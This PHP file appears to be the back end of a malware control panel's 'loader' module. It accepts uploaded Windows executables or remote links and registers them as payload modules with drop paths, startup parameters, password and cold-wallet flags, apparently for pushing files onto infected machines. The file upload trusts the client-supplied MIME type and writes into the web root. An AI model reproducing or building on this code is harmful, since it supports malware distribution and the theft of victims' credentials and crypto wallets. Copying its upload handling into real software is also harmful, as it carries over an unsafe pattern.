<?php


require_once '../../db.php';

switch (trim($_POST['func'])) {
	case "loaderdelete":
		loaderdelete();
		break;
	case "loaderactive":
		loaderactive();
		break;

}

if($_FILES['userfile']['size']!=0)
{
	$allowedType = 'application/x-msdownload';
	if ($_FILES['userfile']['type'] == $allowedType)
	{
		$uploadDir = "../../";
		$uploadFile = $uploadDir . basename($_FILES['userfile']['name']);
		if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadFile)) 
		{
			addModule("http://".$GLOBALS['domain']."/".basename($_FILES['userfile']['name']));
		}
	}
	else
	{
		echo("File is not .exe");
	}
}
else if($_POST['linkToFile']!='')
{
	addModule($_POST['linkToFile']);
}

function loaderdelete(){
	$loaderRule = R::load('loader',$_POST['id']);
	R::trash($loaderRule);
	echo $result = json_encode('deleted');
};

function addModule($pathFile)
{
	$loader = R::dispense('loader');
	
	$loader->name = checkParam($_POST['nameField']);
	$loader->load_to = $_POST['pathToField'];
	$loader->startup_param = checkParam($_POST['paramField']);
	$loader->file_path = $pathFile;
	$loader->pwds = checkParam($_POST['pwdField']);
	if ($_POST['activeCheck'] == "on")
	{
		$loader->is_active = 1;
	}
	else $loader->is_active = 0;
	if ($_POST['walletCheck'] == "on")
	{
		$loader->cold_wallets = 1;
	}
	else $loader->cold_wallets = 0;
	
	R::store($loader);	
	header("Location: /".$GLOBALS['panel_folder']."/loader.php");
	exit(0);
}

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

function loaderactive(){
	$loaderRule = R::load('loader',$_POST['id']);
	$loaderRule->is_active = (boolean)json_decode(strtolower($_POST['check'])); 
	R::store($loaderRule);
	echo $result = json_encode($loaderRule->is_active);	
}




?>